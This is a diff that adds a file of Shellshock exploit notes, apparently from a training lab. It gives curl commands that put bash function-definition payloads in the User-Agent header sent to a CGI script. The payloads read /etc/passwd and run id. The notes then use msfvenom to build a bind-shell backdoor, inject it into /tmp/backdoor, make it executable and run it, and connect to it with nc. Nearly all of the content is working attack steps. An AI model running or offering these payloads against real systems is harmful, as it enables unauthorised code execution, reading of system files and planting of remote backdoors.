@@ -1,0 +1,28 @@
+() { 42;};echo;/bin/cat /etc/passwd
+# curl syntax:
+curl -A "() { 42;};echo;/bin/cat /etc/passwd" http://127.0.0.1/cgi-bin/netstat.cgi
+
+# Run /usr/bin/id:
+() { 42;};echo;/usr/bin/id
+# curl syntax:
+curl -A "() { 42;};echo;/usr/bin/id" http://127.0.0.1/cgi-bin/netstat.cgi
+
+# Install/run bind shell tcp backdoor
+# Create backdoor ELF executable. Ignore warnings, they are harmless.
+$ msfvenom LPORT=8484 -p linux/x86/shell_bind_tcp -f elf  > shellcode
+
+# Should be 163 bytes:
+$ ls -la shellcode
+
+# Convert to properly-formatted and escaped hex. Copy output when complete.
+$ cat shellcode | exe-to-hex.pl
+
+# User-Agent: "() { 42;};echo -e \r\n42$(echo -en <paste hex-encoded-shellcode here> >/tmp/backdoor; /bin/chmod 777 /tmp/backdoor; /tmp/backdoor)42"
+
+# curl syntax:
+curl -A "User-Agent: () { 42;};echo -e \r\n42$(echo -en <paste shellcode here >/tmp/backdoor; /bin/chmod 777 /tmp/backdoor; /tmp/backdoor)42" http://127.0.0.1/cgi-bin/netstat.cgi
+
+$ nc 127.0.0.1 8484
+id
+# uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24
+# (cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
